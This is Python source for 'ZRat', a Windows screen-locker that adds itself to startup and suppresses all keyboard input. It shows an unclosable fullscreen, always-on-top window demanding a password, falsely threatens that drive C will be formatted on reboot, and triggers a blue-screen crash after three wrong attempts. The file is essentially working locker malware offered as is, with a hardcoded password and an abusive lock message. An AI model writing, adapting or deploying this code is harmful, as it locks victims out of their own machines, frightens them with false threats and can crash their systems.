#! /usr/bin python
# -*- coding: utf-8 -*-

from tkinter import *
import time
from tkinter import messagebox
from functools import partial

from modules import bsod, startup, uninstall
import os
import keyboard
import sys

password = "123"
lock_text = "windows blocked.tobi pizda"
count = 3
warning_text = "if you reboot your device then drive C will start auto formatting"  # Ваша надпись

file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
startup(file_path)

def buton(arg):
    enter_pass.insert(END, arg)

def delbuton():
    enter_pass.delete(-1, END)

def tapp(key):
    pass

def check():
    global count
    if enter_pass.get() == password:
        messagebox.showinfo("ZRat","UNLOCKED SUCCESSFULLY")
        uninstall(wind)
    else:
        count -= 1
        if count == 0:
            messagebox.showwarning("ZRat", "number of attempts expired\n\n" + warning_text)
            bsod()
        else:
            messagebox.showwarning("ZRat","Wrong password. Avalible tries: "+ str(count))

def exiting():
    messagebox.showwarning("ZRat", "DEATH IS INEVITABLE\n\n" + warning_text)

wind = Tk()
wind.title("ZRat")
wind["bg"] = "black"

# Создаем эффект "выделения ПКМ" для надписи
warning_frame = Frame(wind, 
                     bg="white",  # Белый фон
                     bd=2,        # Толщина рамки
                     relief="solid",  # Стиль рамки (сплошная линия)
                     highlightbackground="blue",  # Цвет рамки (синий)
                     highlightthickness=1)  # Толщина рамки
warning_frame.pack(pady=5)  # Отступ сверху и снизу

warning_label = Label(warning_frame, 
                     bg="white",      # Белый фон
                     fg="red",        # Красный текст
                     text=warning_text, 
                     font="helvetica 12",
                     padx=5,          # Отступы внутри
                     pady=2)
warning_label.pack()

UNTEXD = Label(wind,bg="black", fg="red",text="WINDOWS LOCKED BY ZRat\n\n\n", font="helvetica 75").pack()
untex = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
untex.pack(side=TOP)

keyboard.on_press(tapp, suppress=True)

enter_pass = Entry(wind,bg="black", fg="red", text="", font="helvetica 35")
enter_pass.pack()
wind.resizable(0,0)

wind.lift()
wind.attributes('-topmost',True)
wind.after_idle(wind.attributes,'-topmost',True)
wind.attributes('-fullscreen', True)

button = Button(wind,text='unlock',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=check)
button.pack()
wind.protocol("WM_DELETE_WINDOW", exiting)

# Кнопки остаются без изменений
button0 = Button(wind,text='0',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "0")).pack(side=LEFT)
button1 = Button(wind,text='1',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "1")).pack(side=LEFT)
button2 = Button(wind,text='2',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "2")).pack(side=LEFT)
button3 = Button(wind,text='3',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "3")).pack(side=LEFT)
button4 = Button(wind,text='4',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "4")).pack(side=LEFT)
button5 = Button(wind,text='5',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "5")).pack(side=LEFT)
button6 = Button(wind,text='6',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "6")).pack(side=LEFT)
button7 = Button(wind,text='7',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "7")).pack(side=LEFT)
button8 = Button(wind,text='8',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "8")).pack(side=LEFT)
button9 = Button(wind,text='9',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "9")).pack(side=LEFT)
delbutton = Button(wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=delbuton).pack(side=LEFT)

wind.mainloop()